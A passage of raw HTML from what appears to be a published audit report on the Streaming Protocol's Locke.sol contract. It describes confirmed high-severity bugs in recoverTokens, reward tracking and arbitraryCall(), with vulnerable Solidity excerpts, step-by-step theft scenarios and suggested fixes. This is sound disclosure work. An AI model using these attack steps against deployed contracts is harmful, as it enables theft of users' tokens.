rewardTokenFeeAmount</code>). This will be transferred.</li>\n<li><code>if (token == rewardToken)</code> executes, the new token balance is just the deposit token amount now (because the reward token amount has been transferred out in the step before). Therefore, <code>ERC20(token).balanceOf(address(this)) >= depositTokenAmount - redeemedDepositTokens</code>. If this is non-negative, the transaction does not revert and the creator makes a profit.</li>\n</ul>\n<p>Example:</p>\n<ul>\n<li>outstanding redeemable deposit token amount: <code>depositTokenAmount - redeemedDepositTokens = 1000</code></li>\n<li>funded <code>rewardTokenAmount</code> (plus <code>rewardTokenFeeAmount</code> fees): <code>rewardTokenAmount + rewardTokenFeeAmount = 500</code></li>\n</ul>\n<p>Creator receives <code>1500 - 1000 = 500</code> excess deposit and <code>1000 - 500 = 500</code> excess reward.</p>\n<h4 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p>When using the same deposit and reward token, the stream creator can steal tokens from the users who will be unable to withdraw their profit or claim their rewards.</p>\n<h4 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>One needs to be careful with using <code>.balanceOf</code> in this special case as it includes both deposit and reward balances.</p>\n<p>Add a special case for <code>recoverTokens</code> when <code>token == depositToken == rewardToken</code> and then the excess should be <code>ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens) - (rewardTokenAmount + rewardTokenFeeAmount);</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/215#issuecomment-989276002\">brockelmore (Streaming Protocol) confirmed</a></strong></p>\n<h2 id=\"h-03-reward-token-not-correctly-recovered\" style=\"position:relative;\"><a href=\"#h-03-reward-token-not-correctly-recovered\" aria-label=\"h 03 reward token not correctly recovered permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/214\">[H-03] Reward token not correctly recovered</a></h2>\n<p><em>Submitted by cmichel, also found by GeekyLumberjack, kenzo, pedroais, and hyh</em></p>\n<p>The <code>Streaming</code> contract allows recovering the reward token by calling <code>recoverTokens(rewardToken, recipient)</code>.</p>\n<p>However, the excess amount is computed incorrectly as <code>ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount)</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">recoverTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">lock</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">token</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">endRewardLock</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;time&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check what isnt claimable by depositors and governance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// @audit-issue rewardTokenAmount increased on fundStream, but never decreased! this excess underflows</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">excess</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - (</span><span class=\"mtk12\">rewardTokenAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">rewardTokenFeeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">excess</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RecoveredTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">excess</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// ...</span></span></span></code></pre>\n<p>Note that <code>rewardTokenAmount</code> only ever <em>increases</em> (when calling <code>fundStream</code>) but it never decreases when claiming the rewards through <code>claimReward</code>.\nHowever, <code>claimReward</code> transfers out the reward token.</p>\n<p>Therefore, the <code>rewardTokenAmount</code> never tracks the contract’s reward balance and the excess cannot be computed that way.</p>\n<h4 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h4>\n<p>Assume no reward fees for simplicity and only a single user staking.</p>\n<ul>\n<li>Someone funds <code>1000</code> reward tokens through <code>fundStream(1000)</code>. Then <code>rewardTokenAmount = 1000</code></li>\n<li>The stream and reward lock period is over, i.e. <code>block.timestamp > endRewardLock</code></li>\n<li>The user claims their full reward and receives <code>1000</code> reward tokens by calling <code>claimReward()</code>. The reward contract balance is now <code>0</code> but <code>rewardTokenAmount = 1000</code></li>\n<li>Some fool sends 1000 reward tokens to the contract by accident. These cannot be recovered as the <code>excess = balance - rewardTokenAmount = 0</code></li>\n</ul>\n<h4 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p>Reward token recovery does not work.</p>\n<h4 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>The claimed rewards need to be tracked as well, just like the claimed deposits are tracked.\nI think you can even decrease <code>rewardTokenAmount</code> in <code>claimReward</code> because at this point <code>rewardTokenAmount</code> is not used to update the <code>cumulativeRewardPerToken</code> anymore.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/214#issuecomment-989285321\">brockelmore (Streaming Protocol) confirmed</a></strong></p>\n<h2 id=\"h-04-improper-implementation-of-arbitrarycall-allows-protocol-gov-to-steal-funds-from-users-wallets\" style=\"position:relative;\"><a href=\"#h-04-improper-implementation-of-arbitrarycall-allows-protocol-gov-to-steal-funds-from-users-wallets\" aria-label=\"h 04 improper implementation of arbitrarycall allows protocol gov to steal funds from users wallets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/258\">[H-04] Improper implementation of <code>arbitraryCall()</code> allows protocol gov to steal funds from users’ wallets</a></h2>\n<p><em>Submitted by WatchPug, also found by Jujic and hack3r-0m</em></p>\n<p><a href=\"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L733-L735\">https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L733-L735</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">arbitraryCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">who</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">lock</span><span class=\"mtk1\"> </span><span class=\"mtk11\">externallyGoverned</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// cannot have an active incentive for the callee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">incentives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">who</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;inc&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span></code></pre>\n<p>When an incentiveToken is claimed after <code>endStream</code>, <code>incentives[who]</code> will be <code>0</code> for that <code>incentiveToken</code>.</p>\n<p>If the protocol gov is malicious or compromised, they can call <code>arbitraryCall()</code> with the address of the incentiveToken as <code>who</code> and <code>transferFrom()</code> as calldata and steal all the incentiveToken in the victim’s wallet balance up to the allowance amount.</p>\n<h4 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<ol>\n<li>Alice approved <code>USDC</code> to the streaming contract;</li>\n<li>Alice called <code>createIncentive()</code> and added <code>1,000 USDC</code> of incentive;</li>\n<li>After the stream is done, the stream creator called <code>claimIncentive()</code> and claimed <code>1,000 USDC</code>;</li>\n</ol>\n<p>The compromised protocol gov can call <code>arbitraryCall()</code> and steal all the USDC in Alice’s wallet balance.</p>\n<h4 id=\"recommendation-1\" style=\"position:relative;\"><a href=\"#recommendation-1\" aria-label=\"recommendation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h4>\n<p>Consider adding a mapping: <code>isIncentiveToken</code>, setting <code>isIncentiveToken[incentiveToken] = true</code> in <code>createIncentive()</code>, and <code>require(!isIncentiveToken[who], ...)</code> in <code>arbitraryCall()</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/258#issuecomment-989281413\">brockelmore (Streaming Protocol) confirmed</a></strong></p>\n<h2 id=\"h-05-possible-incentive-theft-through-the-arbitrarycall-function\" style=\"position:relative;\"><a href=\"#h-05-possible-incentive-theft-through-the-arbitrarycall-function\" aria-label=\"h 05 possible incentive theft through the arbitrarycall function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/199\">[H-05] Possible incentive theft through the arbitraryCall() function</a></h2>\n<p><em>Submitted by toastedsteaksandwich, also found by Omik, ScopeLift, bitbopper, pedroais, gzeon, Meta0xNull, and wuwe1</em></p>\n<h4 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p>The <code>Locke.arbitraryCall()</code> function allows the inherited governance contract to perform arbitrary contract calls within certain constraints. Contract calls to tokens provided as incentives through the createIncentive() function are not allowed if there is some still some balance according to the incentives mapping (See line 735 referenced below).</p>\n<p>However, the token can still be called prior any user creating an incentive, so it’s possible for the <code>arbitraryCall()</code> function to be used to set an allowance on an incentive token before the contract has actually received any of the token through <code>createIncentive()</code>.</p>\n<p>In summary:</p>\n<ol>\n<li>If some possible incentive tokens are known prior to being provided, the <code>arbitraryCall()</code> function can be used to pre-approve a token allowance for a malicious recipient.</li>\n<li>Once a user calls <code>createIncentive()</code> and provides one of the pre-approved tokens, the malicious recipient can call <code>transferFrom</code> on the provided incentive token and withdraw the tokens.</li>\n</ol>\n<h4 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p><a href=\"https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L735\">https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L735</a></p>\n<h4 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<h5 id=\"recommendation-1-1\" style=\"position:relative;\"><a href=\"#recommendation-1-1\" aria-label=\"recommendation 1 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation 1</h5>\n<p>Limit the types of incentive tokens so it can be checked that it’s not the target contract for the arbitraryCall().</p>\n<h5 id=\"recommendation-2\" style=\"position:relative;\"><a href=\"#recommendation-2\" aria-label=\"recommendation 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation 2</h5>\n<p>Validate that the allowance of the target contract (if available) has not changed.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/199#issuecomment-989280130\">brockelmore (Streaming Protocol) confirmed</a></strong></p>\n<h2 id=\"h-06-creating-rewardtokens-without-streaming-deposittokens\" style=\"position:relative;\"><a href=\"#h-06-creating-rewardtokens-without-streaming-deposittokens\" aria-label=\"h 06 creating rewardtokens without streaming deposittokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/166\">[H-06] Creating rewardTokens without streaming depositTokens</a></h2>\n<p><em>Submitted by bitbopper</em></p>\n<h4 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p><code>stake</code> and <code>withdraws</code> can generate rewardTokens without streaming depositTokens.\nIt does not matter whether the stream is a sale or not.</p>\n<p>The following lines can increase the reward balance on a <code>withdraw</code> some time after <code>stake</code>:\n<a href=\"https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L219:L222\">https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L219:L222</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// accumulate reward per token info</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">cumulativeRewardPerToken = rewardPerToken();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// update user rewards</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">ts.rewards = earned(ts, cumulativeRewardPerToken);</span></span></code></pre>\n<p>While the following line can be gamed in order to not stream any tokens (same withdraw tx).</p>\n<p>Specifically an attacker can arrange to create a fraction less than zero thereby substracting zero.</p>\n<p><a href=\"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229\">https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));</span></span>\n<span 